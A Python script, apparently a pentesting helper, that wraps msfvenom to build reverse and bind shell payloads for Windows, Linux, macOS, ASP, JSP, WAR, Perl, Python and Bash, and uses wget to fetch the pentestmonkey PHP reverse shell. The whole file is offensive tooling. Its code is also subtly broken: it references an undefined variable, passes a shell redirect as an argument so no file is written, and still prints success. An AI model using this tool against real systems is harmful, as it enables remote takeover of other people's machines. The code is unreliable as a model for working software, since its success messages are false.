#!/usr/bin/env python
import subprocess
import sys
import os
'''
#################################################
# Very generic payload creator
#################################################
'''
def processor(process): #huge creds to phi10s 
    output=""
    while process.poll() is None:
    	readline=process.stdout.readline()
    	output+=readline
    	sys.stdout.write(readline)
    readline=process.stdout.read()
    output+=readline
    sys.stdout.write(readline)
    sys.stdout.flush()
    return output

try:
	lhost=sys.argv[1]
	if lhost!='-h' and lhost!='php':
		lport=sys.argv[2]
		type=sys.argv[3]
		file=sys.argv[4]
	else:
		type=lhost
except IndexError:
	print('Example format (generic payloads. Please craft specific payloads manually):'
	+"\n./payload.py <host>1.3.3.7 <port>4444 <type>php <file>shell <payload>reverse <execution>(non-)staged"
	+"\n"
	+"\nPayload has to be defined for windows linux and mac types"
	+"\nExecution has to be defined for windows linux and asp types reverse shell"
	+"\nPHP shell is downloaded from pentestmonkey into a tarball. Extract manually")
	print('\ntype -h for payload list')
	sys.exit(-1)

try:
	payload=sys.argv[5]
	execution=sys.argv[6]
except IndexError:
	pass
 
if sys.argv[1]=='-h':
	print('Available payloads')
	print('\nWindows Payloads'
	+'\n----------------'
	+'\nReverse Shell'
	+'\nBind Shell'
	+'\n'
	+'\nLinux Payloads'
	+'\n----------------'
	+'\nReverse Shell'
	+'\nBind Shell'
	+'\nGeneric Shell'
	+'\n'
	+'\nMAC Payloads'
	+'\n----------------'
	+'\nReverse Shell'
	+'\nBind Shell'
	+'\n'
	+'\nWeb Payloads'
	+'\n----------------'
	+'\nReverse ASP Shell'
	+'\nReverse JSP Shell'
	+'\nReverse WAR Shell'
	+'\nReverse PHP Shell'
	+'\n'
	+'\nScript Payloads'
	+'\n----------------'
	+'\nReverse Perl Shell'
	+'\nReverse Python Shell'
	+'\nReverse bash Shell')
	sys.exit(-1)

windows_staged='windows/shell/reverse_tcp'
windows_non_staged='windows/shell_reverse_tcp'
windows_bind='windows/shell/bind_tcp'

linux_staged_86='linux/x86/shell/reverse_tcp'
linux_non_staged='linux/x86/shell_reverse_tcp'
linux_bind='linux/x86/shell/bind_tcp'

mac_bind='osx/x86/shell_bind_tcp'
mac_reverse='osx/x86/shell_reverse_tcp'

jsp='java/jsp_shell_reverse_tcp'
php='php/shell_reverse_tcp'

perl='cmd/unix/reverse_perl'
python='cmd/unix/reverse_python'
bash='cmd/unix/reverse_bash'

try:	
	if type=='windows':
		#windows payloads
		if payload=='reverse' and execution=='staged':
			subprocess.Popen(['msfvenom','-p',windows_staged,'LHOST='+lhost, 'LPORT='+lport , '-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	
		elif payload=='reverse' and execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',windows_non_staged,'LHOST='+lhost, 'LPORT='+lport , '-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	
		elif payload=='bind':
			subprocess.Popen(['msfvenom','-p',windows_bind,'RHOST='+lhost, 'RPORT='+lport , '-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	if type=='linux':		
		#linux payloads
		if payload=='reverse' and execution=='staged':
			subprocess.Popen(['msfvenom','-p',linux_staged,'LHOST='+lhost, 'LPORT='+lport , '-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')
			
		elif payload=='reverse' and execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',linux_non_staged,'LHOST='+lhost, 'LPORT='+lport , '-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')
	
		elif payload=='bind' and type=='linux':
			subprocess.Popen(['msfvenom','-p',linux_bind,'RHOST='+lhost, 'RPORT='+lport , '-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')
	if type=='mac':	
		#MAC payloads
		if payload=='reverse' :
			subprocess.Popen(['msfvenom','-p',mac_reverse,'LHOST='+lhost, 'LPORT='+lport , '-f macho', '>', file+'.macho'])
			print('Payload crafted successfully at',file+'.macho')
	
		elif payload=='bind':
			subprocess.Popen(['msfvenom','-p',mac_bind,'RHOST='+lhost, 'RPORT='+lport , '-f elf', '>', file+'.macho'])
			print('Payload crafted successfully at',file+'.macho')

	
	if type=='asp':
		#Web payloads
		if execution=='staged':
			subprocess.Popen(['msfvenom','-p',windows_staged,'LHOST='+lhost, 'LPORT='+lport , '-f asp', '>', file+'.asp'])
			print('Payload crafted successfully at',file+'.asp')
	
		elif execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',windows_non_staged,'LHOST='+lhost, 'LPORT='+lport , '-f asp', '>', file+'.asp'])
			print('Payload crafted successfully at',file+'.asp')

	elif type=='jsp':
		subprocess.Popen(['msfvenom','-p',jsp,'LHOST='+lhost, 'LPORT='+lport , '-f raw', '>', file+'.jsp'])
		print('Payload crafted successfully at',file+'.jsp')

	elif type=='war':
		subprocess.Popen(['msfvenom','-p',jsp,'LHOST='+lhost, 'LPORT='+lport , '-f war', '>', file+'.war'])
		print('Payload crafted successfully at',file+'.war')

	elif type=='php':
		processor(subprocess.Popen(['wget','http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz'], stdout=subprocess.PIPE))
		print('Payload downloaded successfully')

	#Script payloads
	elif type=='perl':
		subprocess.Popen(['msfvenom','-p',perl,'LHOST='+lhost, 'LPORT='+lport , '-f raw', '>', file+'.pl'])
		print('Payload crafted successfully at',file+'.pl')

	elif type=='python':
		subprocess.Popen(['msfvenom','-p',python,'LHOST='+lhost, 'LPORT='+lport , '-f raw', '>', file+'.py'])
		print('Payload crafted successfully at',file+'.py')

	elif type=='bash':
		subprocess.Popen(['msfvenom','-p',bash,'LHOST='+lhost, 'LPORT='+lport , '-f raw', '>', file+'.sh'])
		print('Payload crafted successfully at',file+'.sh')

except Exception as e:
	raise
	print('Failed to craft payload. Please check your format or report any bugs(jk)')
	
